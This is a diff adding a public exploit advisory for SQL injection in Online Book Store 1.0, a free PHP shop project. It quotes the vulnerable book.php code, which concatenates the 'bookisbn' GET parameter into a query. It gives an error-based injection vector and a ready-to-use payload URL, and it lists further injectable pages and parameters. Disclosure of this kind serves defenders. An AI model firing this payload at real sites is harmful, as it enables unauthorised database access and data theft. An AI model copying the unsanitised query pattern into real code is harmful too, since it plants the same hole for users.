@@ -1,0 +1,58 @@
+# Exploit Title: Online Book Store 1.0 -  'bookisbn' SQL Injection
+# Google Dork: N/A
+# Date: 2020-01-15
+# Exploit Author: AmirHadi Yazdani (Ertebat Gostar Co.)
+# Vendor Homepage: https://projectworlds.in/free-projects/php-projects/online-book-store-project-in-php/
+# Software Link: https://github.com/projectworlds32/online-book-store-project-in-php/archive/master.zip
+# Version: 1.0
+# Tested on: Ubuntu 16.04
+# CVE: N/A
+
+-------------- Vulnerable code in book.php ( Line 1-25) -----------------------------------------------
+  $book_isbn = $_GET['bookisbn']; // vulnerable param 
+  // connecto database
+  require_once "./functions/database_functions.php";
+  $conn = db_connect();
+
+  $query = "SELECT * FROM books WHERE book_isbn = '$book_isbn'"; // Injectable Point
+  $result = mysqli_query($conn, $query);
+  if(!$result){
+    echo "Can't retrieve data " . mysqli_error($conn);
+    exit;
+  }
+
+  $row = mysqli_fetch_assoc($result);
+  if(!$row){
+    echo "Empty book";
+    exit;
+  }
+
+  $title = $row['book_title'];
+  require "./template/header.php";
+?>
+      <!-- Example row of columns -->
+      <p class="lead" style="margin: 25px 0"><a href="books.php">Books</a> > <?php echo $row['book_title']; ?></p> // results goes here
+-------------------------------------------------------------------------------------------------------------------
+
+Exploit POC :
+
+# Parameter: bookisbn (GET)
+# Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+# Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)
+
+#Payload: 
+http://site.com/book.php?bookisbn=123' AND (SELECT 9724 FROM(SELECT COUNT(*),CONCAT(0x716a7a7071,(SELECT (ELT(9724=9724,1))),0x71717a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.Tables GROUP BY x)a) AND 'aJYp'='aJYp
+
+-----------------------
+Other Vulnerable Pages with Same vulnerability  :
+
+[PAGE :bookPerPub.php], [PARAM : pubid ], [Method : GET], [Vulnerable Code : Line 6 & Line 16]
+
+[PAGE :edit_book.php], [PARAM : publisher ], [Method : POST], [Vulnerable Code : Line 13 & Line 27 & Line 31]
+
+[PAGE :checkout.php , Function : getBookByIsbn , Defined in database_functions.php], [PARAM : $isbn ], [Method : SESSION], [Vulnerable Code : Line 30 & Line 26 in database_functions.php]
+
+and other pages .... :)
+
+Also you can have more fun with Other XSS bugs too :)
+----
